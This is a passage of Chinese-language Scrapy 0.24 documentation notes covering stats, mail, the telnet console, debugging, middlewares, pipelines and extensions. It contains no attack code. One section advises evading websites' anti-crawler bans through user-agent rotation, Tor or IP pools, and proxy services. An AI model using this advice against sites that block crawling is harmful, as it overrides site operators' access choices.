当新的值比原来的值大时设置数据: stats.max_value(&apos;max_items_scraped&apos;, value) 当新的值比原来的值小时设置数据: stats.min_value(&apos;min_free_memory_percent&apos;, value) 获取数据: &gt;&gt;&gt; stats.get_value(&apos;pages_crawled&apos;) 8 获取所有数据: &gt;&gt;&gt; stats.get_stats() {&apos;pages_crawled&apos;: 1238, &apos;start_time&apos;: datetime.datetime(2009, 7, 14, 21, 47, 28, 977139)} 可用的数据收集器 除了基本的 StatsCollector ，Scrapy也提供了基于 StatsCollector 的数据收集器。 您可以通过 STATS_CLASS 设置来选择。默认使用的是 MemoryStatsCollector 。 发送email smtplib 库 有两种方法可以创建邮件发送器(mail sender)。 您可以通过标准构造器(constructor)创建: from scrapy.mail import MailSender mailer = MailSender() 或者您可以传递一个Scrapy设置对象，其会参考 settings: mailer = MailSender.from_settings(settings) 这是如何来发送邮件了(不包括附件): mailer.send(to=[&quot;someone@example.com&quot;], subject=&quot;Some subject&quot;, body=&quot;Some body&quot;, cc=[&quot;another@example.com&quot;]) 在Scrapy中发送email推荐使用MailSender。 Mail设置 这些设置定义了 MailSender 构造器的默认值。其使得在您不编写任何一行代码的情况下，为您的项目配置实现email通知的功能。 MAIL_FROM 默认值: &apos;scrapy@localhost&apos; 用于发送email的地址(address)(填入 From:) 。 MAIL_HOST 默认值: &apos;localhost&apos; 发送email的SMTP主机(host)。 MAIL_PORT 默认值: 25 发用邮件的SMTP端口。 MAIL_USER 默认值: None SMTP用户。如果未给定，则将不会进行SMTP认证(authentication)。 MAIL_PASS 默认值: None 用于SMTP认证，与 MAIL_USER 配套的密码。 MAIL_TLS 默认值: False 强制使用STARTTLS。STARTTLS能使得在已经存在的不安全连接上，通过使用SSL/TLS来实现安全连接。 MAIL_SSL 默认值: False 强制使用SSL加密连接。 Telnet终端(Telnet Console) Scrapy提供了内置的telnet终端，以供检查，控制Scrapy运行的进程。 telnet终端监听设置中定义的 TELNETCONSOLE_PORT ，默认为 6023 。 访问telnet请输入: telnet localhost 6023 &gt;&gt;&gt; crawler Scrapy Crawler (scrapy.crawler.Crawler 对象) engine Crawler.engine属性 spider 当前激活的爬虫(spider) slot the engine slot extensions 扩展管理器(manager) (Crawler.extensions属性) stats 状态收集器 (Crawler.stats属性) settings Scrapy设置(setting)对象 (Crawler.settings属性) est 打印引擎状态的报告 prefs 针对内存调试 (参考 调试内存溢出) p pprint.pprint 函数的简写 hpy 针对内存调试 (参考 调试内存溢出) Web Service Scrapy提供用于监控及控制运行中的爬虫的web服务(service)。 Simple JSON resources - 只读，输出JSON数据 JSON-RPC resources - 通过使用 JSON-RPC 2.0 协议支持对一些Scrapy对象的直接访问 Crawler JSON-RPC资源 默认访问地址: http://localhost:6080/crawler 状态收集器(Stats Collector)JSON-RPC资源 默认访问地址: http://localhost:6080/stats 爬虫管理器(Spider Manager)JSON-RPC资源 http://localhost:6080/crawler/spiders 扩展管理器(Extension Manager)JSON-RPC资源 可用JSON资源 引擎状态JSON资源 常见问题(FAQ) BeautifulSoup 及 lxml 是HTML和XML的分析库。Scrapy则是 编写爬虫，爬取网页并获取数据的应用框架(application framework)。 Scrapy是以广度优先还是深度优先进行爬取的呢？ 默认情况下，Scrapy使用 LIFO 队列来存储等待的请求。简单的说，就是 深度优先顺序 。深度优先对大多数情况下是更方便的。如果您想以 广度优先顺序 进行爬取，你可以设置以下的设定: DEPTH_PRIORITY = 1 SCHEDULER_DISK_QUEUE = &apos;scrapy.squeue.PickleFifoDiskQueue&apos; SCHEDULER_MEMORY_QUEUE = &apos;scrapy.squeue.FifoMemoryQueue&apos; 为什么Scrapy下载了英文的页面，而不是我的本国语言？ 尝试通过覆盖 DEFAULT_REQUEST_HEADERS 设置来修改默认的 Accept-Language 请求头。 调试(Debugging)Spiders import scrapy from myproject.items import MyItem class MySpider(scrapy.Spider): name = &apos;myspider&apos; start_urls = ( &apos;http://example.com/page1&apos;, &apos;http://example.com/page2&apos;, ) def parse(self, response): # collect `item_urls` for item_url in item_urls: yield scrapy.Request(item_url, self.parse_item) def parse_item(self, response): item = MyItem() # populate `item` fields # and extract item_details_url yield scrapy.Request(item_details_url, self.parse_details, meta={&apos;item&apos;: item}) def parse_details(self, response): item = response.meta[&apos;item&apos;] # populate more `item` fields return item 简单地说，该spider分析了两个包含item的页面(start_urls)。Item有详情页面， 所以我们使用 Request 的 meta 功能来传递已经部分获取的item。 检查spier输出的最基本方法是使用 parse 命令。 查看特定url爬取到的item: $ scrapy parse --spider=myspider -c parse_item -d 2 &lt;item_url&gt; [ ... scrapy log lines crawling example.com spider ... ] &gt;&gt;&gt; STATUS DEPTH LEVEL 2 &lt;&lt;&lt; # Scraped Items ------------------------------------------------------------ [{&apos;url&apos;: &lt;item_url&gt;}] # Requests ----------------------------------------------------------------- [] 使用 --verbose 或 -v 选项，查看各个层次的状态: $ scrapy parse --spider=myspider -c parse_item -d 2 -v &lt;item_url&gt; 检查从单个start_url爬取到的item也是很简单的: $ scrapy parse --spider=myspider -d 3 &apos;http://example.com/page1&apos; Scrapy终端(Shell) 检查回调函数内部的过程 from scrapy.shell import inspect_response def parse_details(self, response): item = response.meta.get(&apos;item&apos;, None) if item: # populate more `item` fields return item else: inspect_response(response, self) 有时候您想查看某个response在浏览器中显示的效果，这是可以使用 open_in_browser 功能。 from scrapy.utils.response import open_in_browser def parse_details(self, response): if &quot;item name&quot; not in response.body: open_in_browser(response) Logging 记录(logging)是另一个获取到spider运行信息的方法。 from scrapy import log def parse_details(self, response): item = response.meta.get(&apos;item&apos;, None) if item: # populate more `item` fields return item else: self.log(&apos;No item received for %s&apos; % response.url, level=log.WARNING) Spiders Contracts Scrapy通过合同(contract)的方式来提供了测试spider的集成方法。 每个contract包含在文档字符串(docstring)里，以 @ 开头。 查看下面的例子: def parse(self, response): &quot;&quot;&quot; This function parses a sample response. Some contracts are mingled with this docstring. @url http://www.amazon.com/s?field-keywords=selfish+gene @returns items 1 16 @returns requests 0 0 @scrapes Title Author Year Price &quot;&quot;&quot; 该constract(@url)设置了用于检查spider的其他constract状态的样例url。 该contract是必须的，所有缺失该contract的回调函数在测试时将会被忽略: @url url 该contract(@returns)设置spider返回的items和requests的上界和下界。 上界是可选的: @returns item(s)|request(s) [min [max]] 该contract(@scrapes)检查回调函数返回的所有item是否有特定的fields: @scrapes field_1 field_2 ... 自定义Contracts 如果您想要比内置scrapy contract更为强大的功能，可以在您的项目里创建并设置您自己的 contract，并使用 SPIDER_CONTRACTS 设置来加载: SPIDER_CONTRACTS = { &apos;myproject.contracts.ResponseCheck&apos;: 10, &apos;myproject.contracts.ItemValidate&apos;: 10, } 每个contract必须继承 scrapy.contracts.Contract 并覆盖下列三个方法: adjust_request_args(args) pre_process(response) post_process(output) 实践经验(Common Practices) 除了常用的 scrapy crawl 来启动Scrapy，您也可以使用 API 在脚本中启动Scrapy。 需要注意的是，Scrapy是在Twisted异步网络库上构建的， 因此其必须在Twisted reactor里运行。 同一进程运行多个spider 默认情况下，当您执行 scrapy crawl 时，Scrapy每个进程运行一个spider。 当然，Scrapy通过 内部(internal)API 也支持单进程多个spider from twisted.internet import reactor from scrapy.crawler import Crawler from scrapy import log from testspiders.spiders.followall import FollowAllSpider from scrapy.utils.project import get_project_settings def setup_crawler(domain): spider = FollowAllSpider(domain=domain) settings = get_project_settings() crawler = Crawler(settings) crawler.configure() crawler.crawl(spider) crawler.start() for domain in [&apos;scrapinghub.com&apos;, &apos;insophia.com&apos;]: setup_crawler(domain) log.start() reactor.run() 分布式爬虫(Distributed crawls) 如果您有很多spider，那分布负载最简单的办法就是启动多个Scrapyd，并分配到不同机器上。 如果想要在多个机器上运行一个单独的spider，那您可以将要爬取的url进行分块，并发送给spider。 首先，准备要爬取的url列表，并分配到不同的文件url里: http://somedomain.com/urls-to-crawl/spider1/part1.list http://somedomain.com/urls-to-crawl/spider1/part2.list http://somedomain.com/urls-to-crawl/spider1/part3.list 接着在3个不同的Scrapd服务器中启动spider。spider会接收一个(spider)参数 part ， 该参数表示要爬取的分块: curl http://scrapy1.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=1 curl http://scrapy2.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=2 curl http://scrapy3.mycompany.com:6800/schedule.json -d project=myproject -d spider=spider1 -d part=3 避免被禁止(ban) 有些网站实现了特定的机制，以一定规则来避免被爬虫爬取。 下面是些处理这些站点的建议(tips): 使用user agent池，轮流选择之一来作为user agent。池中包含常见的浏览器的user agent(google一下一大堆) 禁止cookies(参考 COOKIES_ENABLED)，有些站点会使用cookies来发现爬虫的轨迹。 设置下载延迟(2或更高)。参考 DOWNLOAD_DELAY 设置。 如果可行，使用 Google cache 来爬取数据，而不是直接访问站点。 使用IP池。例如免费的 Tor项目 或付费服务(ProxyMesh)。 使用高度分布式的下载器(downloader)来绕过禁止(ban)，您就只需要专注分析处理页面。这样的例子有: Crawlera 如果您仍然无法避免被ban，考虑联系 商业支持. 动态创建Item类 对于有些应用，item的结构由用户输入或者其他变化的情况所控制。您可以动态创建class。 from scrapy.item import DictItem, Field def create_item_class(class_name, field_list): fields = {field_name: Field() for field_name in field_list} return type(class_name, (DictItem,), {&apos;fields&apos;: fields}) 通用爬虫(Broad Crawls) 其能爬取大量(甚至是无限)的网站， 仅仅受限于时间或其他的限制。一般用于搜索引擎。 Scrapy默认的全局并发限制对同时爬取大量网站的情况并不适用，因此您需要增加这个值。 增加多少取决于您的爬虫能占用多少CPU。 一般开始可以设置为 100 。不过最好的方式是做一些测试，获得Scrapy进程占取CPU与并发数的关系。 为了优化性能，您应该选择一个能使CPU占用率在80%-90%的并发数。 降低log级别 在生产环境中进行通用爬取时您不应该使用 DEBUG log级别。 不过在开发的时候使用 DEBUG 应该还能接受。 设置Log级别: LOG_LEVEL = &apos;INFO&apos; 禁止cookies能减少CPU使用率及Scrapy爬虫在内存中记录的踪迹，提高性能。 禁止cookies: COOKIES_ENABLED = False 禁止重试: 对失败的HTTP请求进行重试会减慢爬取的效率，尤其是当站点响应很慢(甚至失败)时， 访问这样的站点会造成超时并重试多次。这是不必要的，同时也占用了爬虫爬取其他站点的能力。 RETRY_ENABLED = False 减小下载超时 如果您对一个非常慢的连接进行爬取(一般对通用爬虫来说并不重要)， 减小下载超时能让卡住的连接能被快速的放弃并解放处理其他站点的能力。 减小下载超时: DOWNLOAD_TIMEOUT = 15 关闭重定向: REDIRECT_ENABLED = False 启用 “Ajax Crawlable Pages” 爬取 有些站点(基于2013年的经验数据，之多有1%)声明其为 ajax crawlable 。 这意味着该网站提供了原本只有ajax获取到的数据的纯HTML版本。 网站通过两种方法声明: 在url中使用 #! - 这是默认的方式; 使用特殊的meta标签 - 这在”main”, “index” 页面中使用。 Scrapy自动解决(1)；解决(2)您需要启用 AjaxCrawlMiddleware: AJAXCRAWL_ENABLED = True 通用爬取经常抓取大量的 “index” 页面； AjaxCrawlMiddleware能帮助您正确地爬取。 由于有些性能问题，且对于特定爬虫没有什么意义，该中间默认关闭。 借助Firefox来爬取 对爬取有帮助的实用Firefox插件 Firebug XPather XPath Checker Tamper Data Firecookie 使用Firebug进行爬取 创建第一个爬取规则: Rule(LinkExtractor(allow=&apos;directory.google.com/[A-Z][a-zA-Z_/]+$&apos;, ), &apos;parse_category&apos;, follow=True, ), Rule 对象指导基于 CrawlSpider 的spider如何跟进目录链接。 parse_category 是spider的方法，用于从页面中处理也提取数据。 from scrapy.contrib.linkextractors import LinkExtractor from scrapy.contrib.spiders import CrawlSpider, Rule class GoogleDirectorySpider(CrawlSpider): name = &apos;directory.google.com&apos; allowed_domains = [&apos;directory.google.com&apos;] start_urls = [&apos;http://directory.google.com/&apos;] rules = ( Rule(LinkExtractor(allow=&apos;directory\.google\.com/[A-Z][a-zA-Z_/]+$&apos;), &apos;parse_category&apos;, follow=True, ), ) def parse_category(self, response): # write the category page data extraction code here pass 调试内存溢出 为了帮助调试内存泄露，Scrapy提供了跟踪对象引用的机制，叫做 trackref ， 或者您也可以使用第三方提供的更先进内存调试库 Guppy (更多内容请查看下面)。而这都必须在 Telnet终端 中使用。 内存泄露的常见原因 （常见原因）内存泄露经常是由于Scrapy开发者在Requests中(有意或无意)传递对象的引用(例如，使用 meta 属性或request回调函数)，使得该对象的生命周期与 Request的生命周期所绑定。 使用 trackref 调试内存泄露 trackref 是Scrapy提供用于调试大部分内存泄露情况的模块。 &gt;&gt;&gt; prefs() oldest值越高越是其内存泄漏问题的出处 很多spider? 如果您的项目有很多的spider，prefs() 的输出会变得很难阅读。针对于此， 该方法具有 ignore 参数，用于忽略特定的类(及其子类)。 使用Guppy调试内存泄露 如果使用 setuptools , 您可以通过下列命令安装Guppy: easy_install guppy telnet终端也提供了快捷方式(hpy)来访问Guppy堆对象(heap objects)。 &gt;&gt;&gt; x = hpy.heap() &gt;&gt;&gt; x.bytype 如果您想要查看哪些属性引用了这些字典 &gt;&gt;&gt; x.bytype[0].byvia Leaks without leaks 有时候，您可能会注意到Scrapy进程的内存占用只在增长，从不下降。不幸的是， 有时候这并不是Scrapy或者您的项目在泄露内存。这是由于一个已知(但不有名)的Python问题。 Python在某些情况下可能不会返回已经释放的内存到操作系统。 下载项目图片 Scrapy提供了一个 item pipeline ，来下载属于某个特定项目的图片，比如，当你抓取产品时，也想把它们的图片下载到本地。 这条管道，被称作图片管道，在 ImagesPipeline 类中实现，提供了一个方便并具有额外特性的方法，来下载并本地存储图片: Pillow 是用来生成缩略图，并将图片归一化为JPEG/RGB格式，因此为了使用图片管道，你需要安装这个库。 使用样例 为了使用图片管道，你仅需要 启动它 并用 image_urls 和 images 定义一个项目: import scrapy class MyItem(scrapy.Item): # ... other item fields ... image_urls = scrapy.Field() images = scrapy.Field() 开启你的图片管道 为了开启你的图片管道，你首先需要在项目中添加它 ITEM_PIPELINES setting: ITEM_PIPELINES = {&apos;scrapy.contrib.pipeline.images.ImagesPipeline&apos;: 1} 并将 IMAGES_STORE 设置为一个有效的文件夹，用来存储下载的图片。 比如: IMAGES_STORE = &apos;/path/to/valid/dir&apos; 图片失效 图像管道避免下载最近已经下载的图片。使用 IMAGES_EXPIRES 设置可以调整失效期限，可以用天数来指定: # 90天的图片失效期限 IMAGES_EXPIRES = 90 缩略图生成 图片管道可以自动创建下载图片的缩略图。 为了使用这个特性，你需要设置 IMAGES_THUMBS 字典，其关键字为缩略图名字，值为它们的大小尺寸。 比如: IMAGES_THUMBS = { &apos;small&apos;: (50, 50), &apos;big&apos;: (270, 270), } &lt;size_name&gt; 是 IMAGES_THUMBS 字典关键字（small， big ，等） &lt;image_id&gt; 是图像url的 SHA1 hash 滤出小图片 你可以丢掉那些过小的图片，只需在:setting:IMAGES_MIN_HEIGHT 和 IMAGES_MIN_WIDTH 设置中指定最小允许的尺寸。 比如: IMAGES_MIN_HEIGHT = 110 IMAGES_MIN_WIDTH = 110 实现定制图片管道 在工作流程中可以看到，管道会得到图片的URL并从项目中下载。为了这么做，你需要重写 get_media_requests() 方法，并对各个图片URL返回一个Request: def get_media_requests(self, item, info): for image_url in item[&apos;image_urls&apos;]: yield scrapy.Request(image_url) 这些请求将被管道处理，当它们完成下载后，结果将以2-元素的元组列表形式传送到 item_completed() 方法 当一个单独项目中的所有图片请求完成时（要么完成下载，要么因为某种原因下载失败）， ImagesPipeline.item_completed() 方法将被调用。 item_completed() 方法需要返回一个输出，其将被送到随后的项目管道阶段，因此你需要返回（或者丢弃）项目，如你在任意管道里所做的一样。 reg：如果其中没有图片，我们将丢弃项目: from scrapy.exceptions import DropItem def item_completed(self, results, item, info): image_paths = [x[&apos;path&apos;] for ok, x in results if ok] if not image_paths: raise DropItem(&quot;Item contains no images&quot;) item[&apos;image_paths&apos;] = image_paths return item 定制图片管道的例子 下面是一个图片管道的完整例子: import scrapy from scrapy.contrib.pipeline.images import ImagesPipeline from scrapy.exceptions import DropItem class MyImagesPipeline(ImagesPipeline): def get_media_requests(self, item, info): for image_url in item[&apos;image_urls&apos;]: yield scrapy.Request(image_url) def item_completed(self, results, item, info): image_paths = [x[&apos;path&apos;] for ok, x in results if ok] if not image_paths: raise DropItem(&quot;Item contains no images&quot;) item[&apos;image_paths&apos;] = image_paths return item Ubuntu 软件包 把Scrapy签名的GPG密钥添加到APT的钥匙环中: sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 627220E7 执行如下命令，创建 /etc/apt/sources.list.d/scrapy.list 文件: echo &apos;deb http://archive.scrapy.org/ubuntu scrapy main&apos; | sudo tee /etc/apt/sources.list.d/scrapy.list 更新包列表并安装 scrapy-0.24: sudo apt-get update &amp;&amp; sudo apt-get install scrapy-0.24 自动限速(AutoThrottle)扩展 该扩展能根据Scrapy服务器及您爬取的网站的负载自动限制爬取速度。 在Scrapy中，下载延迟是通过计算建立TCP连接到接收到HTTP包头(header)之间的时间来测量的。 限速算法 算法根据以下规则调整下载延迟及并发数: spider永远以1并发请求数及 AUTOTHROTTLE_START_DELAY 中指定的下载延迟启动。 当接收到回复时，下载延迟会调整到该回复的延迟与之前下载延迟之间的平均值。 AutoThrottle扩展尊重标准Scrapy设置中的并发数及延迟。这意味着其永远不会设置一个比 DOWNLOAD_DELAY 更低的下载延迟或者比 CONCURRENT_REQUESTS_PER_DOMAIN 更高的并发数 (或 CONCURRENT_REQUESTS_PER_IP ，取决于您使用哪一个)。 Benchmarking（基准测试） Scrapy提供了一个简单的性能测试工具。其创建了一个本地HTTP服务器，并以最大可能的速度进行爬取。 该测试性能工具目的是测试Scrapy在您的硬件上的效率，来获得一个基本的底线用于对比。 其使用了一个简单的spider，仅跟进链接，不做任何处理。 scrapy bench Jobs: 暂停，恢复爬虫 Scrapy通过如下工具支持这个功能: 一个把调度请求保存在磁盘的调度器 一个把访问请求保存在磁盘的副本过滤器[duplicates filter] 一个能持续保持爬虫状态(键/值对)的扩展 要启用持久化支持，你只需要通过 JOBDIR 设置 job directory 选项。这个路径将会存储 所有的请求数据来保持一个单独任务的状态(例如：一次spider爬取(a spider run))。 要启用一个爬虫的持久化，运行以下命令: scrapy crawl somespider -s JOBDIR=crawls/somespider-1 然后，你就能在任何时候安全地停止爬虫(按Ctrl-C或者发送一个信号)。恢复这个爬虫也是同样的命令: scrapy crawl somespider -s JOBDIR=crawls/somespider-1 保持状态 有的时候，你希望持续保持一些运行长时间的蜘蛛的状态。这时您可以使用 spider.state 属性, 请求序列化 请求是由 pickle 进行序列化的，所以你需要确保你的请求是可被pickle序列化的。 这里最常见的问题是在在request回调函数中使用 lambda 方法，导致无法序列化。 DjangoItem DjangoItem 是一个item的类，其从Django模型中获取字段(field)定义。 创造一个Django模型: from django.db import models class Person(models.Model): name = models.CharField(max_length=255) age = models.IntegerField() 定义一个基本的 DjangoItem: from scrapy.contrib.djangoitem import DjangoItem class PersonItem(DjangoItem): django_model = Person DjangoItem 的使用方法和 Item 类似: &gt;&gt;&gt; p = PersonItem() &gt;&gt;&gt; p[&apos;name&apos;] = &apos;John&apos; &gt;&gt;&gt; p[&apos;age&apos;] = &apos;22&apos; 要从item中获取Django模型，调用 DjangoItem 中额外的方法 save(): &gt;&gt;&gt; person = p.save() &gt;&gt;&gt; person.name &apos;John&apos; &gt;&gt;&gt; person.age &apos;22&apos; &gt;&gt;&gt; person.id 1 当我们调用 save() 时，模型已经保存了。我们可以在调用时带上 commit=False 来避免保存， 并获取到一个未保存的模型: &gt;&gt;&gt; person = p.save(commit=False) &gt;&gt;&gt; person.name &apos;John&apos; &gt;&gt;&gt; person.age &apos;22&apos; &gt;&gt;&gt; person.id None 配置Django的设置 在Django应用之外使用Django模型(model)，您需要设置 DJANGO_SETTINGS_MODULE 环境变量以及 –大多数情况下– 修改 PYTHONPATH 环境变量来导入设置模块。 架构概览 Scrapy Engine 引擎负责控制数据流在系统中所有组件中流动，并在相应动作发生时触发事件。 调度器(Scheduler) 调度器从引擎接受request并将他们入队，以便之后引擎请求他们时提供给引擎。 下载器(Downloader) 下载器负责获取页面数据并提供给引擎，而后提供给spider。 Spiders Spider是Scrapy用户编写用于分析response并提取item(即获取到的item)或额外跟进的URL的类。 Item Pipeline Item Pipeline负责处理被spider提取出来的item。典型的处理有清理、 验证及持久化(例如存取到数据库中)。 下载器中间件(Downloader middlewares) 下载器中间件是在引擎及下载器之间的特定钩子(specific hook)，处理Downloader传递给引擎的response。 Spider中间件(Spider middlewares) Spider中间件是在引擎及Spider之间的特定钩子(specific hook)，处理spider的输入(response)和输出(items及requests)。 数据流(Data flow) Scrapy中的数据流由执行引擎控制，其过程如下: 引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的URL(s)。 引擎从Spider中获取到第一个要爬取的URL并在调度器(Scheduler)以Request调度。 引擎向调度器请求下一个要爬取的URL。 调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件(请求(request)方向)转发给下载器(Downloader)。 一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件(返回(response)方向)发送给引擎。 引擎从下载器中接收到Response并通过Spider中间件(输入方向)发送给Spider处理。 Spider处理Response并返回爬取到的Item及(跟进的)新的Request给引擎。 引擎将(Spider返回的)爬取到的Item给Item Pipeline，将(Spider返回的)Request给调度器。 (从第二步)重复直到调度器中没有更多地request，引擎关闭该网站。 事件驱动网络(Event-driven networking) Scrapy基于事件驱动网络框架 Twisted 编写。因此，Scrapy基于并发性考虑由非阻塞(即异步)的实现。 下载器中间件(Downloader Middleware) 下载器中间件是介于Scrapy的request/response处理的钩子框架。 是用于全局修改Scrapy request和response的一个轻量、底层的系统。 激活下载器中间件 要激活下载器中间件组件，将其加入到 DOWNLOADER_MIDDLEWARES 设置中。 该设置是一个字典(dict)，键为中间件类的路径，值为其中间件的顺序(order)。 这里是一个例子: DOWNLOADER_MIDDLEWARES = { &apos;myproject.middlewares.CustomDownloaderMiddleware&apos;: 543, } DOWNLOADER_MIDDLEWARES 设置会与Scrapy定义的 DOWNLOADER_MIDDLEWARES_BASE 设置合并(但不是覆盖)， 而后根据顺序(order)进行排序，最后得到启用中间件的有序列表: 第一个中间件是最靠近引擎的，最后一个中间件是最靠近下载器的。 编写您自己的下载器中间件 process_request(request, spider) 当每个request通过下载中间件时，该方法被调用。 process_response(request, response, spider) process_request() 必须返回以下之一: 返回一个 Response 对象、 返回一个 Request 对象或raise一个 IgnoreRequest 异常。 process_exception(request, exception, spider) 当下载处理器(download handler)或 process_request() (下载中间件)抛出异常(包括 IgnoreRequest 异常)时， Scrapy调用 process_exception() 。 内置下载中间件参考手册 CookiesMiddleware 该中间件使得爬取需要cookie(例如使用session)的网站成为了可能。 其追踪了web server发送的cookie，并在之后的request中发送回去， 就如浏览器所做的那样。 HttpCacheMiddleware 该中间件为所有HTTP request及response提供了底层(low-level)缓存支持。 其由cache存储后端及cache策略组成。 Scrapy提供了两种HTTP缓存存储后端: Filesystem storage backend (默认值) DBM storage backend Scrapy提供了两种了缓存策略: RFC2616策略 Dummy策略(默认值) Dummy策略(默认值) 该策略不考虑任何HTTP Cache-Control指令。每个request及其对应的response都被缓存。 当相同的request发生时，其不发送任何数据，直接返回response。 RFC2616策略 该策略提供了符合RFC2616的HTTP缓存，例如符合HTTP Cache-Control， 针对生产环境并且应用在持续性运行环境所设置。该策略能避免下载未修改的数据(来节省带宽，提高爬取速度)。 使用这个策略，设置: HTTPCACHE_POLICY 为 scrapy.contrib.httpcache.RFC2616Policy 。。。 Spider中间件(Middleware) Spider中间件是介入到Scrapy的spider处理机制的钩子框架，您可以添加代码来处理发送给 Spiders 的response及spider产生的item和request。 激活spider中间件 要启用spider中间件，您可以将其加入到 SPIDER_MIDDLEWARES 设置中。 该设置是一个字典，键位中间件的路径，值为中间件的顺序(order)。 样例: SPIDER_MIDDLEWARES = { &apos;myproject.middlewares.CustomSpiderMiddleware&apos;: 543, } SPIDER_MIDDLEWARES 设置会与Scrapy定义的 SPIDER_MIDDLEWARES_BASE 设置合并(但不是覆盖)， 而后根据顺序(order)进行排序，最后得到启用中间件的有序列表: 第一个中间件是最靠近引擎的，最后一个中间件是最靠近spider的。 如果您想禁止内置的(在 SPIDER_MIDDLEWARES_BASE 中设置并默认启用的)中间件， 您必须在项目的 SPIDER_MIDDLEWARES 设置中定义该中间件，并将其值赋为 None 。 例如，如果您想要关闭off-site中间件: SPIDER_MIDDLEWARES = { &apos;myproject.middlewares.CustomSpiderMiddleware&apos;: 543, &apos;scrapy.contrib.spidermiddleware.offsite.OffsiteMiddleware&apos;: None, } 编写您自己的spider中间件 process_spider_input(response, spider) 当response通过spider中间件时，该方法被调用，处理该response。 process_spider_input() 应该返回 None 或者抛出一个异常。 如果其返回 None ，Scrapy将会继续处理该response，调用所有其他的中间件直到spider处理该response。 如果其跑出一个异常(exception)，Scrapy将不会调用任何其他中间件的 process_spider_input() 方法，并调用request的errback。 errback的输出将会以另一个方向被重新输入到中间件链中，使用 process_spider_output() 方法来处理，当其抛出异常时则带调用 process_spider_exception() 。 process_spider_output(response, result, spider) 当Spider处理response返回result时，该方法被调用。 process_spider_output() 必须返回包含 Request 或 Item 对象的可迭代对象(iterable)。 process_spider_exception(response, exception, spider) 当spider或(其他spider中间件的) process_spider_input() 跑出异常时， 该方法被调用。 process_start_requests(start_requests, spider) 该方法以spider 启动的request为参数被调用，执行的过程类似于 process_spider_output() ，只不过其没有相关联的response并且必须返回request(不是item)。 其接受一个可迭代的对象(start_requests 参数)且必须返回另一个包含 Request 对象的可迭代对象。 内置spider中间件参考手册 DepthMiddleware DepthMiddleware是一个用于追踪每个Request在被爬取的网站的深度的中间件。 其可以用来限制爬取深度的最大深度或类似的事情。 HttpErrorMiddleware 过滤出所有失败(错误)的HTTP response，因此spider不需要处理这些request。 处理这些request意味着消耗更多资源，并且使得spider逻辑更为复杂。 HTTPERROR_ALLOWED_CODES 默认: [] 忽略该列表中所有非200状态码的response。 HTTPERROR_ALLOW_ALL 默认: False 忽略所有response，不管其状态值。 。。。 扩展(Extensions) 扩展设置(Extension settings) 扩展使用 Scrapy settings 管理它们的设置 通常扩展需要给它们的设置加上前缀，以避免跟已有(或将来)的扩展冲突。 比如，一个扩展处理 Google Sitemaps， 则可以使用类似 GOOGLESITEMAP_ENABLED、GOOGLESITEMAP_DEPTH 等设置。 加载和激活扩展 扩展在扩展类被实例化时加载和激活。 因此，所有扩展的实例化代码必须在类的构造函数(__init__)中执行。 要使得扩展可用，需要把它添加到Scrapy的 EXTENSIONS 配置中。 在 EXTENSIONS 中，每个扩展都使用一个字符串表示，即扩展类的全Python路径。 比如: EXTENSIONS = { &apos;scrapy.contrib.corestats.CoreStats&apos;: 500, &apos;scrapy.webservice.WebService&apos;: 500, &apos;scrapy.telnet.TelnetConsole&apos;: 500, } 扩展之间一般没有关联。 扩展加载的顺序并不重要，因为它们并不相互依赖。 [1] 这也是为什么Scrapy的配置项 EXTENSIONS_BASE (它包括了所有内置且开启的扩展)定义所有扩展的顺序都相同 (500)。 可用的(Available)、开启的(enabled)和禁用的(disabled)的扩展 禁用扩展(Disabling an extension) EXTENSIONS = { &apos;scrapy.contrib.corestats.CoreStats&apos;: None, } 实现你的扩展 Scrapy扩展(包括middlewares和pipelines)的主要入口是 from_crawler 类方法， 它接收一个 Crawler 类的实例，该实例是控制Scrapy crawler的主要对象。 通常来说，扩展关联到 signals 并执行它们触发的任务。 最后，如果 from_crawler 方法抛出 NotConfigured 异常， 扩展会被禁用。否则，扩展会被开启。 reg：该扩展会在以下事件时记录一条日志： spider被打开 spider被关闭 爬取了特定数量的条目(items) 该扩展通过 MYEXT_ENABLED 配置项开启， items的数量通过 MYEXT_ITEMCOUNT 配置项设置。 from scrapy import signals from scrapy.exceptions import NotConfigured class SpiderOpenCloseLogging(object): def __init__(self, item_count): self.item_count = item_count self.items_scraped = 0 @classmethod def from_crawler(cls, crawler): # first check if the extension should be enabled and raise # NotConfigured otherwise if not crawler.settings.getbool(&apos;MYEXT_ENABLED&apos;): raise NotConfigured # get the number of items from settings item_count = crawler.settings.getint(&apos;MYEXT_ITEMCOUNT&apos;, 1000) # instantiate the extension object ext = cls(item_count) # connect the extension object to signals crawler.signals.connect(ext.spider_opened, signal=signals.spider_opened) crawler.signals.connect(ext.spider_closed, signal=signals.spider_closed) crawler.signals.connect(ext.item_scraped, signal=signals.item_scraped) # return the extension object return ext def spider_opened(self, spider): spider.log(&quot;opened spider %s&quot; % spider.name) def spider_closed(self, spider): spider.log(&quot;closed spider %s&quot; % spider.name) def item_scraped(self, item, spider): self.items_scraped += 1 if self.items_scraped % self.item_count == 0: spider.log(&quot;scraped %d items&quot; % self.items_scraped) 内置扩展介绍 通用扩展 记录统计扩展(Log Stats extension) class scrapy.contrib.logstats.LogStats Web service 扩展 class scrapy.webservice.WebService 内存使用扩展(Memory usage extension) class scrapy.contrib.memusage.MemoryUsage 监控Scrapy进程内存使用量，并且： 如果使用内存量超过某个指定值，发送提醒邮件 如果超过某个指定值，关闭spider 该扩展通过 MEMUSAGE_ENABLED 配置项开启，可以使用以下选项： MEMUSAGE_LIMIT_MB MEMUSAGE_WARNING_MB MEMUSAGE_NOTIFY_MAIL MEMUSAGE_REPORT 内存调试扩展(Memory debugger extension) class scrapy.contrib.memdebug.MemoryDebugger 该扩展用于调试内存使用量，它收集以下信息： 没有被Python垃圾回收器收集的对象 应该被销毁却仍然存活的对象。 CLOSESPIDER_ERRORCOUNT 一个整数值，指定spider可以接受的最大错误数。 如果spider生成多于该数目的错误，它将以 closespider_errorcount 的原因关闭。 如果设置为0（或者未设置），spiders不会因为发生错误过多而关闭。 StatsMailer extension class scrapy.contrib.statsmailer.StatsMailer 这个简单的扩展可用来在一个域名爬取完毕时发送提醒邮件， 包含Scrapy收集的统计信息。 邮件会发送个通过 